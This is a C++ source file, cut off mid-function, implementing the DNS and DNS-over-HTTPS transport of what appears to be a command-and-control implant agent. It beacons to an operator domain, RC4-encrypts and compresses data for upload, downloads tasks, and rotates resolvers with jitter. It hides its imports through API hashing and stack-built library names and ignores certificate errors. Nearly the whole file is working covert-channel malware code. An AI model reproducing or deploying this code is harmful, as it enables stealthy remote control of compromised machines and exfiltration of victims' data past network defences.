#include "ConnectorDNS.h"
#include "DnsCodec.h"
#include "Crypt.h"
#include "utils.h"
#include "ApiLoader.h"
#include "ProcLoader.h"
#include "Agent.h"

extern Agent* g_Agent;

static inline void WriteBE32(BYTE* dst, ULONG val) {
    dst[0] = (BYTE)(val >> 24);
    dst[1] = (BYTE)(val >> 16);
    dst[2] = (BYTE)(val >> 8);
    dst[3] = (BYTE)(val);
}

static inline ULONG ReadBE32(const BYTE* src) {
    return ((ULONG)src[0] << 24) | ((ULONG)src[1] << 16) | ((ULONG)src[2] << 8) | (ULONG)src[3];
}

static inline ULONG ReadLE32(const BYTE* src) {
    return (ULONG)src[0] | ((ULONG)src[1] << 8) | ((ULONG)src[2] << 16) | ((ULONG)src[3] << 24);
}

static USHORT ParseQtypeCode(const CHAR* qtypeStr) {
    if (!qtypeStr || !qtypeStr[0])
        return 16; // TXT default
    CHAR qt[8];
    memset(qt, 0, sizeof(qt));
    int qi = 0;
    while (qtypeStr[qi] && qi < (int)sizeof(qt) - 1) {
        CHAR c = qtypeStr[qi];
        if (c >= 'a' && c <= 'z')
            c = (CHAR)(c - 'a' + 'A');
        qt[qi++] = c;
    }
    qt[qi] = '\0';
    if (qt[0] == 'A' && qt[1] == '\0')
        return 1;
    if (qt[0] == 'A' && qt[1] == 'A' && qt[2] == 'A' && qt[3] == 'A' && qt[4] == '\0')
        return 28;
    return 16;
}

void* ConnectorDNS::operator new(size_t sz)
{
    void* p = MemAllocLocal(sz);
    return p;
}

void ConnectorDNS::operator delete(void* p) noexcept
{
    MemFreeLocal(&p, sizeof(ConnectorDNS));
}

ConnectorDNS::ConnectorDNS()
{
    this->functions = (DNSFUNC*)ApiWin->LocalAlloc(LPTR, sizeof(DNSFUNC));
    if (!this->functions)
        return;

    this->functions->LocalAlloc    = ApiWin->LocalAlloc;
    this->functions->LocalReAlloc  = ApiWin->LocalReAlloc;
    this->functions->LocalFree     = ApiWin->LocalFree;
    this->functions->WSAStartup    = ApiWin->WSAStartup;
    this->functions->WSACleanup    = ApiWin->WSACleanup;
    this->functions->socket        = ApiWin->socket;
    this->functions->closesocket   = ApiWin->closesocket;
    this->functions->sendto        = ApiWin->sendto;
    this->functions->recvfrom      = ApiWin->recvfrom;
    this->functions->select        = ApiWin->select;
    this->functions->gethostbyname = ApiWin->gethostbyname;
    this->functions->Sleep         = ApiWin->Sleep;
    this->functions->GetTickCount  = ApiWin->GetTickCount;
    this->functions->LoadLibraryA  = ApiWin->LoadLibraryA;
    this->functions->GetLastError  = ApiWin->GetLastError;

    // Initialize DoH functions structure
    this->dohFunctions = (DOHFUNC*)ApiWin->LocalAlloc(LPTR, sizeof(DOHFUNC));
}

ConnectorDNS::~ConnectorDNS()
{
    CloseConnector();
    if (this->dohFunctions) {
        this->functions->LocalFree(this->dohFunctions);
        this->dohFunctions = NULL;
    }
    if (this->functions) {
        this->functions->LocalFree(this->functions);
        this->functions = NULL;
    }
}

// WSA initialization (called once)
BOOL ConnectorDNS::InitWSA()
{
    if (this->wsaInitialized)
        return TRUE;

    if (!this->functions || !this->functions->WSAStartup)
        return FALSE;

    WSADATA wsaData;
    if (this->functions->WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
        return FALSE;

    this->wsaInitialized = TRUE;

    // Allocate reusable buffers
    if (!this->queryBuffer)
        this->queryBuffer = (BYTE*)MemAllocLocal(kQueryBufferSize);
    if (!this->respBuffer)
        this->respBuffer = (BYTE*)MemAllocLocal(kRespBufferSize);

    return TRUE;
}

// WSA cleanup (called on close)
void ConnectorDNS::CleanupWSA()
{
    if (this->cachedSocket != INVALID_SOCKET) {
        this->functions->closesocket(this->cachedSocket);
        this->cachedSocket = INVALID_SOCKET;
    }

    if (this->queryBuffer) {
        MemFreeLocal((LPVOID*)&this->queryBuffer, kQueryBufferSize);
        this->queryBuffer = NULL;
    }
    if (this->respBuffer) {
        MemFreeLocal((LPVOID*)&this->respBuffer, kRespBufferSize);
        this->respBuffer = NULL;
    }

    if (this->wsaInitialized && this->functions && this->functions->WSACleanup) {
        this->functions->WSACleanup();
        this->wsaInitialized = FALSE;
    }
}

BOOL ConnectorDNS::InitDoH()
{
    if (this->dohInitialized)
        return TRUE;

    if (!this->functions || !this->functions->LoadLibraryA || !this->dohFunctions)
        return FALSE;

    // Load wininet.dll
    CHAR wininet_c[12];
    wininet_c[0] = 'w';
    wininet_c[1] = 'i';
    wininet_c[2] = 'n';
    wininet_c[3] = 'i';
    wininet_c[4] = 'n';
    wininet_c[5] = 'e';
    wininet_c[6] = 't';
    wininet_c[7] = '.';
    wininet_c[8] = 'd';
    wininet_c[9] = 'l';
    wininet_c[10] = 'l';
    wininet_c[11] = 0;

    HMODULE hWininetModule = this->functions->LoadLibraryA(wininet_c);
    if (!hWininetModule)
        return FALSE;

    this->dohFunctions->InternetOpenA              = (decltype(InternetOpenA)*)              GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETOPENA);
    this->dohFunctions->InternetConnectA           = (decltype(InternetConnectA)*)           GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETCONNECTA);
    this->dohFunctions->HttpOpenRequestA           = (decltype(HttpOpenRequestA)*)           GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPOPENREQUESTA);
    this->dohFunctions->HttpSendRequestA           = (decltype(HttpSendRequestA)*)           GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPSENDREQUESTA);
    this->dohFunctions->InternetSetOptionA         = (decltype(InternetSetOptionA)*)         GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETSETOPTIONA);
    this->dohFunctions->InternetQueryOptionA       = (decltype(InternetQueryOptionA)*)       GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETQUERYOPTIONA);
    this->dohFunctions->HttpQueryInfoA             = (decltype(HttpQueryInfoA)*)             GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPQUERYINFOA);
    this->dohFunctions->InternetQueryDataAvailable = (decltype(InternetQueryDataAvailable)*) GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETQUERYDATAAVAILABLE);
    this->dohFunctions->InternetCloseHandle        = (decltype(InternetCloseHandle)*)        GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETCLOSEHANDLE);
    this->dohFunctions->InternetReadFile           = (decltype(InternetReadFile)*)           GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETREADFILE);

    if (!this->dohFunctions->InternetOpenA || !this->dohFunctions->HttpSendRequestA)
        return FALSE;

    CHAR* userAgent = (CHAR*)this->profile.user_agent;
    this->hInternet = this->dohFunctions->InternetOpenA(userAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!this->hInternet)
        return FALSE;

    this->dohInitialized = TRUE;
    return TRUE;
}

void ConnectorDNS::CleanupDoH()
{
    if (this->hInternet && this->dohFunctions && this->dohFunctions->InternetCloseHandle) {
        this->dohFunctions->InternetCloseHandle(this->hInternet);
        this->hInternet = NULL;
    }
    this->dohInitialized = FALSE;
}

void ConnectorDNS::ParseDohResolvers(const CHAR* dohResolvers)
{
    this->dohResolverCount = 0;
    memset(this->dohResolverList, 0, sizeof(this->dohResolverList));
    for (ULONG i = 0; i < kMaxResolvers; ++i) {
        this->dohResolverFailCount[i] = 0;
        this->dohResolverDisabledUntil[i] = 0;
    }

    if (!dohResolvers || !dohResolvers[0])
        return;

    // Copy to temporary buffer for parsing
    CHAR tempBuf[1024];
    StrLCopyA(tempBuf, dohResolvers, sizeof(tempBuf));

    CHAR* p = tempBuf;
    while (*p && this->dohResolverCount < kMaxResolvers) {
        // Skip whitespace and separators
        while (*p == ' ' || *p == '\t' || *p == ',' || *p == ';' || *p == '\r' || *p == '\n') ++p;
        if (!*p) break;

        // Find end of URL
        CHAR* urlStart = p;
        while (*p && *p != ',' && *p != ';' && *p != ' ' && *p != '\t' && *p != '\r' && *p != '\n') ++p;
        CHAR savedChar = *p;
        if (*p) *p = '\0';

        // Parse URL: https://host/path or https://host:port/path
        DohResolverInfo* info = &this->dohResolverList[this->dohResolverCount];
        info->port = 443;  // Default HTTPS port

        CHAR* hostStart = urlStart;
        // Skip "https://" prefix if present
        if (hostStart[0] == 'h' && hostStart[1] == 't' && hostStart[2] == 't' && hostStart[3] == 'p') {
            hostStart += 4;
            if (*hostStart == 's') hostStart++;
            if (hostStart[0] == ':' && hostStart[1] == '/' && hostStart[2] == '/') {
                hostStart += 3;
            }
        }

        // Find path separator
        CHAR* pathStart = hostStart;
        while (*pathStart && *pathStart != '/' && *pathStart != ':') ++pathStart;

        // Check for port
        if (*pathStart == ':') {
            *pathStart = '\0';
            StrLCopyA(info->host, hostStart, sizeof(info->host));
            pathStart++;
            info->port = 0;
            while (*pathStart >= '0' && *pathStart <= '9') {
                info->port = info->port * 10 + (*pathStart - '0');
                pathStart++;
            }
            if (info->port == 0) 
                info->port = 443;
        }
        else {
            CHAR savedPath = *pathStart;
            *pathStart = '\0';
            StrLCopyA(info->host, hostStart, sizeof(info->host));
            *pathStart = savedPath;
        }

        // Copy path (default to /dns-query)
        if (*pathStart == '/')
            StrLCopyA(info->path, pathStart, sizeof(info->path));
        else
            StrLCopyA(info->path, "/dns-query", sizeof(info->path));

        if (info->host[0])
            this->dohResolverCount++;

        if (savedChar) {
            *p = savedChar;
            p++;
        }
    }
}

// Build DNS wire format query
BOOL ConnectorDNS::BuildDnsWireQuery(const CHAR* qname, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outLen)
{
    if (!outBuf || outBufSize < 512 || !outLen)
        return FALSE;

    *outLen = 0;
    memset(outBuf, 0, outBufSize);

    // DNS header
    USHORT id = (USHORT)(this->functions->GetTickCount() & 0xFFFF);
    outBuf[0] = (BYTE)(id >> 8);
    outBuf[1] = (BYTE)(id & 0xFF);
    outBuf[2] = 0x01;  // RD flag
    outBuf[3] = 0x00;
    outBuf[4] = 0x00;
    outBuf[5] = 0x01;  // QDCOUNT = 1

    ULONG offset = 12;

    // Encode query name
    int nameLen = DnsCodec::EncodeName(qname, outBuf + offset, outBufSize - offset - 4);
    if (nameLen < 0)
        return FALSE;
    offset += nameLen;

    USHORT qtypeCode = ParseQtypeCode(qtypeStr);

    outBuf[offset++] = (BYTE)(qtypeCode >> 8);
    outBuf[offset++] = (BYTE)(qtypeCode & 0xFF);
    outBuf[offset++] = 0x00;
    outBuf[offset++] = 0x01;  // IN class

    *outLen = offset;
    return TRUE;
}

// Parse DNS wire format response (reuse logic from QuerySingle)
BOOL ConnectorDNS::ParseDnsWireResponse(BYTE* response, ULONG respLen, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize)
{
    *outSize = 0;
    if (!response || respLen <= 12 || !outBuf)
        return FALSE;

    USHORT qtypeCode = ParseQtypeCode(qtypeStr);

    // Parse DNS response
    int qdcount = (response[4] << 8) | response[5];
    int ancount = (response[6] << 8) | response[7];
    int pos = 12;

    // Skip questions
    for (int qi = 0; qi < qdcount; ++qi) {
        while (pos < (int)respLen && response[pos] != 0) {
            if ((response[pos] & 0xC0) == 0xC0) {
                pos += 2;
                break;
            }
            pos += response[pos] + 1;
        }
        pos++;
        pos += 4;
    }

    // Parse answers
    ULONG written = 0;
    for (int ai = 0; ai < ancount; ++ai) {
        if (pos + 12 > (int)respLen)
            return FALSE;
        if ((response[pos] & 0xC0) == 0xC0)
            pos += 2;
        else {
            while (pos < (int)respLen && response[pos] != 0) {
                pos += response[pos] + 1;
            }
            pos++;
        }
        USHORT type = (response[pos] << 8) | response[pos + 1];
        pos += 2;
        pos += 2; // class
        pos += 4; // TTL
        USHORT rdlen = (response[pos] << 8) | response[pos + 1];
        pos += 2;
        if (pos + rdlen > (int)respLen)
            return FALSE;

        if (qtypeCode == 16 && type == 16 && rdlen > 0) {
            // TXT record
            USHORT consumed = 0;
            ULONG txtWritten = 0;
            while (consumed < rdlen) {
                if (pos + consumed >= (int)respLen)
                    break;
                BYTE txtLen = response[pos + consumed];
                consumed++;
                if (consumed + txtLen > rdlen)
                    break;
                if (txtLen > 0 && txtWritten + txtLen <= outBufSize) {
                    memcpy(outBuf + txtWritten, response + pos + consumed, txtLen);
                    txtWritten += txtLen;
                }
                consumed += txtLen;
            }
            if (txtWritten > 0) {
                *outSize = txtWritten;
                return TRUE;
            }
        }
        else if (qtypeCode == 1 && type == 1 && rdlen >= 4) {
            // A record
            if (written + 4 <= outBufSize) {
                memcpy(outBuf + written, response + pos, 4);
                written += 4;
            }
        }
        else if (qtypeCode == 28 && type == 28 && rdlen >= 16) {
            // AAAA record
            if (written + 16 <= outBufSize) {
                memcpy(outBuf + written, response + pos, 16);
                written += 16;
            }
        }
        pos += rdlen;
    }

    if ((qtypeCode == 1 || qtypeCode == 28) && written > 0) {
        *outSize = written;
        return TRUE;
    }

    return FALSE;
}

// Single DoH query via HTTPS POST
BOOL ConnectorDNS::QueryDoH(const CHAR* qname, const DohResolverInfo* resolver, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize)
{
    *outSize = 0;
    if (!this->dohInitialized && !InitDoH())
        return FALSE;

    if (!resolver || !resolver->host[0] || !this->dohFunctions)
        return FALSE;

    // Build DNS wire format query
    BYTE dnsQuery[512];
    ULONG queryLen = 0;
    if (!BuildDnsWireQuery(qname, qtypeStr, dnsQuery, sizeof(dnsQuery), &queryLen))
        return FALSE;

    // Connect to DoH server
    HINTERNET hConnect = this->dohFunctions->InternetConnectA( this->hInternet, resolver->host, resolver->port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0 );
    if (!hConnect)
        return FALSE;

    // Open POST request
    CHAR acceptTypes[] = "application/dns-message";
    LPCSTR rgpszAcceptTypes[] = { acceptTypes, NULL };
    DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_UI | INTERNET_FLAG_NO_COOKIES | INTERNET_FLAG_SECURE;

    HINTERNET hRequest = this->dohFunctions->HttpOpenRequestA( hConnect, "POST", resolver->path, NULL, NULL, rgpszAcceptTypes, flags, 0 );
    if (!hRequest) {
        this->dohFunctions->InternetCloseHandle(hConnect);
        return FALSE;
    }

    // Set security flags to ignore certificate errors (like in ConnectorHTTP)
    DWORD dwFlags;
    DWORD dwBuffer = sizeof(DWORD);
    if (this->dohFunctions->InternetQueryOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, &dwBuffer)) {
        dwFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA | INTERNET_FLAG_IGNORE_CERT_CN_INVALID;
        this->dohFunctions->InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
    }

    // Set Content-Type header for DoH
    CHAR headers[] = "Content-Type: application/dns-message\r\nAccept: application/dns-message\r\n";

    // Send request with DNS query as body
    BOOL sendOk = this->dohFunctions->HttpSendRequestA( hRequest, headers, (DWORD)-1, (LPVOID)dnsQuery, queryLen );
    BOOL result = FALSE;
    if (sendOk) {
        // Check status code
        CHAR statusCode[32];
        DWORD statusCodeLen = sizeof(statusCode);
        if (this->dohFunctions->HttpQueryInfoA(hRequest, HTTP_QUERY_STATUS_CODE, statusCode, &statusCodeLen, 0)) {
            int status = 0;
            for (int i = 0; statusCode[i] >= '0' && statusCode[i] <= '9'; i++) {
                status = status * 10 + (statusCode[i] - '0');
            }

            if (status == 200) {
                // Read response
                BYTE respBuf[4096];
                DWORD totalRead = 0;
                DWORD bytesRead = 0;
                DWORD bytesAvailable = 0;

                while (this->dohFunctions->InternetQueryDataAvailable(hRequest, &bytesAvailable, 0, 0) && bytesAvailable > 0) {
                    if (totalRead + bytesAvailable > sizeof(respBuf))
                        bytesAvailable = sizeof(respBuf) - totalRead;
                    if (bytesAvailable == 0)
                        break;

                    if (this->dohFunctions->InternetReadFile(hRequest, respBuf + totalRead, bytesAvailable, &bytesRead)) {
                        totalRead += bytesRead;
                        if (bytesRead == 0)
                            break;
                    }
                    else {
                        break;
                    }
                }

                // Parse DNS response
                if (totalRead > 12) {
                    result = ParseDnsWireResponse(respBuf, totalRead, qtypeStr, outBuf, outBufSize, outSize);
                }
            }
        }
    }

    this->dohFunctions->InternetCloseHandle(hRequest);
    this->dohFunctions->InternetCloseHandle(hConnect);

    return result;
}

BOOL ConnectorDNS::QueryDoHWithRotation(const CHAR* qname, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize)
{
    *outSize = 0;

    if (this->dohResolverCount == 0)
        return FALSE;

    for (ULONG i = 0; i < this->dohResolverCount; ++i) {
        ULONG idx = (this->currentDohResolverIndex + i) % this->dohResolverCount;
        DohResolverInfo* resolver = &this->dohResolverList[idx];
        if (!resolver->host[0]) continue;

        ULONG nowTick = this->functions->GetTickCount();
        if (this->dohResolverDisabledUntil[idx] && nowTick < this->dohResolverDisabledUntil[idx])
            continue;

        if (QueryDoH(qname, resolver, qtypeStr, outBuf, outBufSize, outSize)) {
            this->currentDohResolverIndex = idx;
            this->dohResolverFailCount[idx] = 0;
            this->dohResolverDisabledUntil[idx] = 0;
            return TRUE;
        }

        this->dohResolverFailCount[idx]++;

        if (this->dohResolverFailCount[idx] >= kMaxFailCount) {
            ULONG backoff = 30000;
            if (this->sleepDelaySeconds > 0) {
                ULONG b = this->sleepDelaySeconds * 2000;
                if (b < 5000) b = 5000;
                if (b > 30000) b = 30000;
                backoff = b;
            }
            ULONG currentTick = this->functions->GetTickCount();
            ULONG jitter = currentTick & 0x0FFF;
            this->dohResolverDisabledUntil[idx] = currentTick + backoff + jitter;
            this->dohResolverFailCount[idx] = 0;
        }
    }
    return FALSE;
}

// Get socket (reuse cached or create new)
SOCKET ConnectorDNS::GetSocket()
{
    if (this->cachedSocket != INVALID_SOCKET)
        return this->cachedSocket;

    if (!this->functions || !this->functions->socket)
        return INVALID_SOCKET;

    this->cachedSocket = this->functions->socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    return this->cachedSocket;
}

// Release socket (keep cached unless forced close)
void ConnectorDNS::ReleaseSocket(SOCKET s, BOOL forceClose)
{
    if (s == INVALID_SOCKET)
        return;

    if (forceClose) {
        this->functions->closesocket(s);
        if (s == this->cachedSocket)
            this->cachedSocket = INVALID_SOCKET;
    }
    // If not forced, keep socket cached for reuse
}

// Private helper: Initialize DNS metadata header
void ConnectorDNS::MetaV1Init(DNS_META_V1* h)
{
    if (!h)
        return;
    h->version = 1;
    h->metaFlags = 0;
    h->reserved = 0;
    h->downAckOffset = 0;
}

// Private helper: Build wire sequence number
ULONG ConnectorDNS::BuildWireSeq(ULONG logicalSeq, ULONG signalBits)
{
    ULONG seqCounter = logicalSeq & 0x0FFF;
    ULONG sig = signalBits & 0x0F;
    return (sig << 12) | seqCounter;
}

// Private helper: Parse resolver list
void ConnectorDNS::ParseResolvers(const CHAR* resolvers)
{
    this->resolverCount = 0;
    memset(this->rawResolvers, 0, sizeof(this->rawResolvers));
    for (ULONG i = 0; i < kMaxResolvers; ++i) {
        this->resolverList[i] = NULL;
        this->resolverFailCount[i] = 0;
        this->resolverDisabledUntil[i] = 0;
    }

    StrLCopyA(this->rawResolvers, resolvers, sizeof(this->rawResolvers));
    CHAR* p = this->rawResolvers;
    while (*p && this->resolverCount < kMaxResolvers) {
        while (*p == ' ' || *p == '\t' || *p == ',' || *p == ';' || *p == '\r' || *p == '\n') ++p;
        if (!*p) 
            break;
        this->resolverList[this->resolverCount++] = p;
        while (*p && *p != ',' && *p != ';' && *p != ' ' && *p != '\t' && *p != '\r' && *p != '\n') ++p;
        if (*p) *p++ = '\0';
    }
}

// Private helper: Build ACK data buffer
void ConnectorDNS::BuildAckData(BYTE* ackData, ULONG ackOffset, ULONG nonce, ULONG taskNonce)
{
    WriteBE32(ackData, ackOffset);
    WriteBE32(ackData + 4, nonce);
    WriteBE32(ackData + 8, taskNonce);
}

// Private helper: Reset download state
void ConnectorDNS::ResetDownload()
{
    if (this->downBuf && this->downTotal) {
        MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
    }
    this->downBuf = NULL;
    this->downTotal = 0;
    this->downFilled = 0;
    this->downAckOffset = 0;
    this->downTaskNonce = 0;
    this->hasPendingTasks = FALSE;
}

// Reset upload state for retry
void ConnectorDNS::ResetUploadState()
{
    memset(this->confirmedOffsets, 0, sizeof(this->confirmedOffsets));
    this->confirmedCount = 0;
    this->lastAckNextExpected = 0;
    this->uploadNeedsReset = FALSE;
    this->uploadStartTime = 0;
}

// Check if offset was confirmed by server
BOOL ConnectorDNS::IsOffsetConfirmed(ULONG offset)
{
    for (ULONG i = 0; i < this->confirmedCount && i < kMaxTrackedOffsets; i++) {
        if (this->confirmedOffsets[i] == offset)
            return TRUE;
    }
    return FALSE;
}

// Mark offset as confirmed
void ConnectorDNS::MarkOffsetConfirmed(ULONG offset)
{
    if (this->confirmedCount >= kMaxTrackedOffsets)
        return;
    if (!IsOffsetConfirmed(offset))
        this->confirmedOffsets[this->confirmedCount++] = offset;
}

// Parse PUT ACK response from A record
// Format: [flags:1][nextExpectedOff:3 (big-endian 24-bit)]
// Flags: 0x01 = complete, 0x02 = needs_reset
BOOL ConnectorDNS::ParsePutAckResponse(BYTE* response, ULONG respLen, ULONG* outNextExpected, BOOL* outComplete, BOOL* outNeedsReset)
{
    if (!response || respLen < 4)
        return FALSE;

    // Response should be 4 bytes (A record IP)
    BYTE flags = response[0];
    ULONG nextExpected = ((ULONG)response[1] << 16) | ((ULONG)response[2] << 8) | (ULONG)response[3];

    if (outComplete)
        *outComplete = (flags & 0x01) ? TRUE : FALSE;
    if (outNeedsReset)
        *outNeedsReset = (flags & 0x02) ? TRUE : FALSE;
    if (outNextExpected)
        *outNextExpected = nextExpected;
    return TRUE;
}

// Private helper: Single DNS query
BOOL ConnectorDNS::QuerySingle(const CHAR* qname, const CHAR* resolverIP, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize)
{
    *outSize = 0;
    if (!this->functions || !this->functions->sendto || !this->functions->recvfrom)
        return FALSE;

    // Initialize WSA once (cached)
    if (!InitWSA())
        return FALSE;

    // Get cached or new socket
    SOCKET s = GetSocket();
    if (s == INVALID_SOCKET)
        return FALSE;

    const CHAR* resolver = resolverIP;

    HOSTENT* he = this->functions->gethostbyname(resolver);
    if (!he || !he->h_addr_list || !he->h_addr_list[0]) {
        ReleaseSocket(s, TRUE);  // Force close on error
        return FALSE;
    }

    sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = _htons(53);
    memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);

    BYTE* query = this->queryBuffer;
    ULONG queryBufSize = kQueryBufferSize;
    BYTE stackQuery[4096];
    if (!query) {
        query = stackQuery;
        queryBufSize = sizeof(stackQuery);
    }
    ULONG queryLen = 0;
    if (!BuildDnsWireQuery(qname, qtypeStr, query, queryBufSize, &queryLen)) {
        ReleaseSocket(s, TRUE);
        return FALSE;
    }

    // Send query
    int sent = this->functions->sendto(s, (const char*)query, queryLen, 0, (sockaddr*)&addr, sizeof(addr));
    if (sent != (int)queryLen) {
        ReleaseSocket(s, TRUE);
        return FALSE;
    }

    // Wait for response with timeout
    fd_set readfds;
    readfds.fd_count = 1;
    readfds.fd_array[0] = s;
    timeval timeout;
    timeout.tv_sec = kQueryTimeout;
    timeout.tv_usec = 0;

    int selResult = this->functions->select(0, &readfds, NULL, NULL, &timeout);
    if (selResult <= 0) {
        ReleaseSocket(s, TRUE);
        return FALSE;
    }

    // Receive response
    BYTE* resp = this->respBuffer;
    ULONG respBufSize = kRespBufferSize;
    BYTE stackResp[4096];
    if (!resp) {
        resp = stackResp;
        respBufSize = sizeof(stackResp);
    }

    int addrLen = sizeof(addr);
    int recvLen = this->functions->recvfrom(s, (char*)resp, respBufSize, 0, (sockaddr*)&addr, &addrLen);

    ReleaseSocket(s, FALSE);

    if (recvLen <= 12)
        return FALSE;

    // Parse DNS response using shared helper
    return ParseDnsWireResponse(resp, (ULONG)recvLen, qtypeStr, outBuf, outBufSize, outSize);
}

BOOL ConnectorDNS::SetProfile(void* profilePtr, BYTE* beat, ULONG beatSize)
{
    ProfileDNS profile = *(ProfileDNS*)profilePtr;
    this->profile = profile;
    this->sleepDelaySeconds = g_Agent ? g_Agent->config->sleep_delay : 0;

    ParseResolvers((CHAR*)profile.resolvers);

    ParseDohResolvers((CHAR*)profile.doh_resolvers);
    this->dnsMode = profile.dns_mode;

    if (!profile.encrypt_key)
        return FALSE;
    memset(this->encryptKey, 0, sizeof(this->encryptKey));
    memcpy(this->encryptKey, profile.encrypt_key, 16);

    this->pktSize = profile.pkt_size ? profile.pkt_size : kDefaultPktSize;
    if (this->pktSize > kMaxPktSize)
        this->pktSize = kMaxPktSize;

    this->labelSize = profile.label_size ? profile.label_size : kDefaultLabelSize;
    if (this->labelSize == 0 || this->labelSize > kMaxLabelSize)
        this->labelSize = kDefaultLabelSize;

    if (profile.domain)
        StrLCopyA(this->domain, (CHAR*)profile.domain, sizeof(this->domain));
    else
        this->domain[0] = 0;

    StrLCopyA(this->qtype, (CHAR*)"TXT", sizeof(this->qtype));

    if (!beat || !beatSize || beatSize < 8)
        return FALSE;

    // Extract agent ID from beat
    BYTE* beatCopy = (BYTE*)MemAllocLocal(beatSize);
    if (!beatCopy)
        return FALSE;
    memcpy(beatCopy, beat, beatSize);

    EncryptRC4(beatCopy, beatSize, this->encryptKey, 16);

    ULONG agentId = (beatSize >= 8) ? ReadBE32(beatCopy + 4) : 0;
    MemFreeLocal((LPVOID*)&beatCopy, beatSize);

    ApiWin->snprintf(this->sid, sizeof(this->sid), "%08x", agentId);

    // Store beat for HI message
    if (beat && beatSize) {
        this->hiBeat = (BYTE*)MemAllocLocal(beatSize);
        if (this->hiBeat) {
            memcpy(this->hiBeat, beat, beatSize);
            this->hiBeatSize = beatSize;
            this->hiRetries = kMaxRetries;
            this->hiSent = FALSE;
        }
    }

    this->initialized = TRUE;
    return TRUE;
}

void ConnectorDNS::CloseConnector()
{
    // Cleanup WSA and cached resources
    CleanupWSA();

    CleanupDoH();

    if (this->recvData) {
        MemFreeLocal((LPVOID*)&this->recvData, (ULONG)this->recvSize);
        this->recvData = NULL;
        this->recvSize = 0;
    }
    if (this->hiBeat && this->hiBeatSize) {
        MemFreeLocal((LPVOID*)&this->hiBeat, this->hiBeatSize);
        this->hiBeat = NULL;
        this->hiBeatSize = 0;
    }
    if (this->downBuf && this->downTotal) {
        MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
        this->downBuf = NULL;
        this->downTotal = 0;
        this->downFilled = 0;
    }
    if (this->pendingUpload && this->pendingUploadSize) {
        MemFreeLocal((LPVOID*)&this->pendingUpload, this->pendingUploadSize);
        this->pendingUpload = NULL;
        this->pendingUploadSize = 0;
    }
}

void ConnectorDNS::Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
{
    this->lastExchangeHadData = (plainData != NULL && plainSize > 0);

#ifdef BEACON_DNS
    if (g_Agent) {
        BYTE* dnsResolvers = g_Agent->config->profile.resolvers;
        if (dnsResolvers && dnsResolvers != (BYTE*)this->GetResolvers())
            this->UpdateResolvers(dnsResolvers);

        this->UpdateSleepDelay(g_Agent->config->sleep_delay);
        this->UpdateBurstConfig(g_Agent->config->profile.burst_enabled, g_Agent->config->profile.burst_sleep, g_Agent->config->profile.burst_jitter);

        ULONG now = this->functions->GetTickCount();
        if (this->nextForcePollTick == 0)
            this->nextForcePollTick = now + 1500 + (now & 0x3FF);

        BOOL idle = !this->lastExchangeHadData && !this->IsBusy() && (this->pendingUpload == NULL);
        if (idle && now >= this->nextForcePollTick) {
            ULONG baseSleep = this->sleepDelaySeconds;
            ULONG interval = baseSleep * 3000;
            if (interval < 6000) interval = 6000;
            if (interval > 60000) interval = 60000;
            interval += (now & 0x3FF);
            this->nextForcePollTick = now + interval;

            if (!this->IsForcePollPending())
                this->ForcePollOnce();
        }
    }
#endif

    // Handle pending upload retry
    if (this->pendingUpload && this->pendingUploadSize) {
        ULONG now = this->functions->GetTickCount();
        if (now >= this->nextUploadAttemptTick) {
            this->SendData(this->pendingUpload, this->pendingUploadSize);
            if (this->lastQueryOk) {
                MemFreeLocal((LPVOID*)&this->pendingUpload, this->pendingUploadSize);
                this->pendingUpload = NULL;
                this->pendingUploadSize = 0;
                this->uploadBackoffMs = 0;
                this->nextUploadAttemptTick = 0;
            }
            else {
                ULONG base = this->uploadBackoffMs ? this->uploadBackoffMs : 500;
                ULONG next = base * 2;
                if (next > 30000) next = 30000;
                this->uploadBackoffMs = next;
                this->nextUploadAttemptTick = this->functions->GetTickCount() + this->uploadBackoffMs + (this->functions->GetTickCount() & 0x3FF);
            }
        }
        else {
            this->SendData(NULL, 0);
        }
    }
    else if (plainData && plainSize > 0) {
        BYTE* payload = plainData;
        ULONG payloadLen = plainSize;
        BYTE  flags = 0;

        const ULONG minCompressSize = 512;
        if (payloadLen > minCompressSize) {
            BYTE* compBuf = NULL;
            ULONG compLen = 0;
            if (DnsCodec::Compress(payload, payloadLen, &compBuf, &compLen) && compBuf && compLen > 0 && compLen < payloadLen) {
                payload = compBuf;
                payloadLen = compLen;
                flags = 1;
            }
        }

        ULONG sessionLen = 1 + 4 + payloadLen;
        BYTE* sessionBuf = (BYTE*)MemAllocLocal(sessionLen);
        BYTE* sendBuf = NULL;
        ULONG sendLen = 0;

        if (sessionBuf) {
            sessionBuf[0] = flags;
            sessionBuf[1] = (BYTE)(plainSize & 0xFF);
            sessionBuf[2] = (BYTE)((plainSize >> 8) & 0xFF);
            sessionBuf[3] = (BYTE)((plainSize >> 16) & 0xFF);
